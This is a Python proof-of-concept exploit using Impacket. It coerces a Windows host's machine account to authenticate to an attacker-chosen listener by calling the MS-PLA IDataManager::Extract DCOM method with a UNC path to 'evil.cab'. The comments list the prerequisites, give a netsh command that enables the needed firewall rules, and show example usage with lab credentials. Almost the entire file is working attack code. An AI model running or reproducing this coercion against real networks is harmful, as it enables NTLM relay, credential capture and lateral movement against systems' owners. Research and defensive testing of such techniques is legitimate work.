#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Proof of concept for coercing authentication with
# MS-PLA::IDataManager::Extract() (opnum 31).
#
# Extract extracts a cabinet file (CabFilename) into DestinationPath. The server
# opens CabFilename to read it, so a UNC CabFilename makes the Performance Logs
# and Alerts service (running as the machine account) authenticate to the
# listener. CabFilename is read-only -- no writable share is required.
#
# Extract lives on IDataManager (NOT IDataCollectorSet). The DCOM chain is:
#   CoCreateInstanceEx(CLSID_DataCollectorSet, IID_IDataCollectorSet)
#   IDataCollectorSet::get_DataManager        [opnum 57]  -> IDataManager
#   IDataManager::Extract(CabFilename="\\<listener>\share\evil.cab", dest)  [opnum 31]
#
# Note: CLSID_DataCollectorSet is 03837521-... (the coclass); the interface
# IID_IDataCollectorSet is 03837520-... . Activating with ...20 as the CLSID
# returns REGDB_E_CLASSNOTREG.
#
# PREREQUISITES on the target:
#   1. Local administrator (PLA DCOM launch/access).
#   2. The "Performance Logs and Alerts" firewall rule group must be ENABLED
#      (predefined, DCOM-In + TCP-In, disabled by default). PLA is DCOM-only and
#      its interface calls use the RPC dynamic port range; with the group off the
#      DCOM activation on TCP/135 succeeds but interface calls are dropped. Enable:
#        netsh advfirewall firewall set rule group="Performance Logs and Alerts" new enable=yes
#
#   ./coerce_poc.py -d LAB.local -u user -p 'Password123!' 192.168.2.51 192.168.2.1
#     (positional order: <listener> <target>)
import argparse

from impacket.dcerpc.v5.dcomrt import (
    DCOMConnection, INTERFACE, IRemUnknown2, PMInterfacePointer, DCOMCALL, DCOMANSWER,
)
from impacket.dcerpc.v5.dtypes import ULONG
from impacket.dcerpc.v5.dcom.oaut import BSTR
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket import hresult_errors
from impacket.uuid import string_to_bin, uuidtup_to_bin

CLSID_DataCollectorSet = string_to_bin('03837521-098B-11D8-9414-505054503030')
IID_IDataCollectorSet  = uuidtup_to_bin(('03837520-098B-11D8-9414-505054503030', '0.0'))
IID_IDataManager       = uuidtup_to_bin(('03837541-098B-11D8-9414-505054503030', '0.0'))


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        code = self.error_code or 0
        if code in hresult_errors.ERROR_MESSAGES:
            return 'Extract HRESULT: 0x%08x - %s' % (code, hresult_errors.ERROR_MESSAGES[code][0])
        return 'Extract HRESULT: 0x%08x' % code


# IDataCollectorSet::get_DataManager (opnum 57) -> [out, retval] IDataManager**
class get_DataManager(DCOMCALL):
    opnum = 57
    structure = ()


class get_DataManagerResponse(DCOMANSWER):
    structure = (('ppDataManager', PMInterfacePointer), ('ErrorCode', ULONG))


# IDataManager::Extract (opnum 31)
class Extract(DCOMCALL):
    opnum = 31
    structure = (('CabFilename', BSTR), ('DestinationPath', BSTR))


class ExtractResponse(DCOMANSWER):
    structure = (('ErrorCode', ULONG),)


def _bstr(s):
    b = BSTR()
    b['Data']['asData'] = s
    return b


def _join(abData):
    if abData and isinstance(abData[0], (bytes, bytearray)):
        return b''.join(bytes(x) for x in abData)
    return ''.join(abData)


def main():
    parser = argparse.ArgumentParser(add_help=True, description='MS-PLA Extract coercion PoC.')
    parser.add_argument('-d', '--domain', default='', help='(FQDN) domain to authenticate to.')
    parser.add_argument('-u', '--username', required=True, help='User to authenticate as.')
    parser.add_argument('-p', '--password', default='', help='Password to authenticate with.')
    parser.add_argument('--share', default='share', help='Share component of the UNC cab path.')
    parser.add_argument('listener', help='IP/hostname the target should authenticate to.')
    parser.add_argument('target', help='IP/hostname of the target PLA server.')
    args = parser.parse_args()

    cab = '\\\\%s\\%s\\evil.cab' % (args.listener, args.share)
    dest = 'C:\\Windows\\Temp\\plaext'

    print('[>] Activating CLSID_DataCollectorSet, IID_IDataCollectorSet ...')
    dcom = DCOMConnection(args.target, args.username, args.password, args.domain, oxidResolver=True)
    try:
        iDcs = dcom.CoCreateInstanceEx(CLSID_DataCollectorSet, IID_IDataCollectorSet)
        print('[+] activated; get_DataManager (opnum 57) ...')
        resp = iDcs.request(get_DataManager(), IID_IDataCollectorSet, iDcs.get_iPid())
        iDm = IRemUnknown2(INTERFACE(iDcs.get_cinstance(), _join(resp['ppDataManager']['abData']),
                                     iDcs.get_ipidRemUnknown(), target=iDcs.get_target()))
        print('[+] got IDataManager; Extract(CabFilename=%s) ...' % cab)
        req = Extract()
        req['CabFilename'] = _bstr(cab)
        req['DestinationPath'] = _bstr(dest)
        try:
            iDm.request(req, IID_IDataManager, iDm.get_iPid())
            print('[+] Extract returned S_OK -- check your listener')
        except Exception as e:
            print('[i] Extract returned: %s -- check your listener' % str(e)[:80])
    finally:
        dcom.disconnect()


if __name__ == '__main__':
    main()
